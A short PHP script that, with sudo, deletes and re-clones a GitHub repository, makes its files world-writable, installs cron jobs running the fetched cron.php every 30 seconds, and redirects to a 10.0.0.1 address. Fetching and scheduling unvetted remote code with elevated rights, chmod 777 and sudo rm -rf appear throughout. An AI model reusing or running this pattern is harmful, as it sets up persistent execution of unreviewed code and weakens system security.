<?php

// Function to execute shell commands and check results
function executeCommand($command, $successMessage, $errorMessage) {
    exec($command . ' 2>&1', $output, $returnCode);
    if ($returnCode === 0) {
        echo $successMessage . "\n";
        return true;
    } else {
        echo $errorMessage . ": " . implode("\n", $output) . "\n";
        return false;
    }
}

// Step 1: Clone the repository
if (is_dir('pv')) {
    $removeCommand = "sudo rm -rf pv";
    if (!executeCommand($removeCommand, "Existing pv directory removed successfully", "Failed to remove existing pv directory")) {
        exit(1);
    }
}
$cloneCommand = "sudo git clone https://github.com/s1L3n7-sH/pv";
if (!executeCommand($cloneCommand, "Repository cloned successfully", "Failed to clone repository")) {
    exit(1);
}

// Step 2: Change directory and set permissions
if (is_dir('pv')) {
    $chmodCommand = "sudo bash -c 'cd pv && chmod 777 *'";
    if (!executeCommand($chmodCommand, "Permissions set successfully", "Failed to set permissions")) {
        exit(1);
    }
} else {
    echo "Error: Repository directory not found\n";
    exit(1);
}

// Step 3: Add cron jobs
$sourceCronFile = "pv/cron.php";
if (file_exists($sourceCronFile)) {
    // Get the absolute path of pv/cron.php
    $absoluteCronPath = realpath($sourceCronFile);
    if (!$absoluteCronPath) {
        echo "Error: Could not resolve absolute path for {$sourceCronFile}\n";
        exit(1);
    }
    echo "Verified: {$sourceCronFile} exists at {$absoluteCronPath}\n";
    
    // Add cron jobs using the absolute path to pv/cron.php
    $cronCommand = "sudo bash -c '(crontab -l 2>/dev/null; echo \"* * * * * php {$absoluteCronPath}\"; echo \"* * * * * sleep 30 && php {$absoluteCronPath}\") | crontab -'";
    if (executeCommand($cronCommand, "Cron jobs added successfully", "Failed to add cron jobs")) {
        // Verify cron jobs were added
        exec("crontab -l", $cronOutput, $cronReturnCode);
        if ($cronReturnCode === 0 && !empty($cronOutput)) {
            $cronContent = implode("\n", $cronOutput);
            if (strpos($cronContent, "php {$absoluteCronPath}") !== false) {
                echo "Verified: Cron jobs for {$absoluteCronPath} found in crontab\n";
            } else {
                echo "Error: Cron jobs for {$absoluteCronPath} not found in crontab\n";
                exit(1);
            }
        } else {
            echo "Error: Failed to verify cron jobs\n";
            exit(1);
        }
    } else {
        exit(1);
    }
} else {
    echo "Error: {$sourceCronFile} not found in repository\n";
    exit(1);
}

// Step 4: Redirect to the specified URL
header("Location: http://10.0.0.1/pv/cron.php");
exit();

?>
